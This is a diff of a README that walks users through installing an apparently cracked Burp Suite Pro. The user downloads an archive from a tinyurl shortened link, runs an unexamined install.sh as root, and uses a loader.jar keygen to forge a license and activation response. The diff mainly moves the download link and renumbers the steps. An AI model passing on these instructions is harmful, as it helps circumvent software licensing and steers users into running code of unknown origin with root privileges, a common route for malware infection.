@@ -60,60 +60,51 @@ Follow the sequence below to run the installation script as root, execute under 
 
 https://github.com/user-attachments/assets/84da740c-71e6-4eeb-8562-b2cf44c128cb
 
-> 🎥 **[Direct Link: Watch Recording 2 — Complete Setup & Graphical Launcher](https://github.com/user-attachments/assets/84da740c-71e6-4eeb-8562-b2cf44c128cb)**
+> 🎥 **[Direct Link: Watch Recording 2 — Complete Setup & Graphical Launcher](https://github.com/user-attachments/assets/84da740c-71e6-4eeb-8562-b2cf44c128cb)**  
+> 📥 **Download Link:** [tinyurl.com/burpsuitepro2026](https://tinyurl.com/burpsuitepro2026)
 
 ---
 
 ### Step-by-Step Instructions:
 
-#### Step 2.1: Download & Extract the Setup Package
-Download the setup file from:
-> 📥 **[https://tinyurl.com/burpsuitepro2026](https://tinyurl.com/burpsuitepro2026)**
-
-Extract the downloaded archive:
-```bash
-unzip BurpSuitePro-v2026.zip
-```
-
-#### Step 2.2: Switch to Root User
+#### Step 2.1: Switch to Root User
 Open your terminal and switch to the root user:
 ```bash
 sudo su
 ```
 
-#### Step 2.3: Navigate into the Folder
+#### Step 2.2: Navigate into the Folder
 Enter the directory containing the setup files:
 ```bash
 cd BurpSuitePro-v2026
 ```
 
-#### Step 2.4: Make `install.sh` Executable and Run
-Grant execute permission to `install.sh` and execute it:
+#### Step 2.3: Grant Permissions and Run `install.sh`
+Make sure you are on the root user before running the script. Grant execute permission to `install.sh` and run it:
 ```bash
 chmod +x install.sh
 ./install.sh
 ```
-*This script installs dependencies, sets up the binary shortcut, and automatically opens both `loader.jar` and Burp Suite.*
+*This will automatically launch both the loader and Burp Suite for you.*
 
-#### Step 2.5: Close Initial Burp Suite Window
-When Burp Suite launches and prompts for the license key / terms:
+#### Step 2.4: Close Initial Burp Suite Window
+When Burp Suite opens asking for the license and other setup details:
 - **Close the Burp Suite window.**
-- Keep `loader.jar` open.
+- Keep the `loader.jar` window open.
 
-#### Step 2.6: Open a New Terminal Tab as Normal User
-Open a **new terminal tab or window**, ensuring you are **NOT** on the root user (use your regular user account), then run:
+#### Step 2.5: Open a New Tab as Normal (Non-Root) User
+Open a **new terminal tab**, make sure that user is **not** the root user, and run:
 ```bash
 burpsuitepro
 ```
-Burp Suite will launch again under your normal user profile.
+Burp Suite will open up again under your regular user.
 
-#### Step 2.7: Complete Manual License Activation
-1. In the **loader.jar** window, copy the generated **License**.
-2. Paste the license into the Burp Suite license screen and click **Next**.
-3. Select **Manual Activation**.
-4. Click **Copy Request** in Burp Suite and paste it into the **Activation Request** box in `loader.jar`.
-5. Copy the generated **Activation Response** from `loader.jar` and paste it back into Burp Suite.
-6. Click **Next** -> **Finish**.
+#### Step 2.6: Continue the Activation Process
+1. Copy the license from the **loader.jar** window into Burp Suite and click **Next**.
+2. Select **Manual Activation**.
+3. Click **Copy Request** in Burp Suite and paste it into the **Activation Request** box in `loader.jar`.
+4. Copy the generated **Activation Response** from `loader.jar` and paste it back into Burp Suite.
+5. Click **Next** -> **Finish**.
 
-#### Step 2.8: Graphical Desktop Launcher
-Refer to **Video Walkthrough 2** above for the visual guide on creating a desktop graphical application launcher icon for quick access.
+#### Step 2.7: Graphical Desktop Launcher
+Refer to **Video Walkthrough 2** above for the visual walkthrough on how to create a graphical desktop launcher.
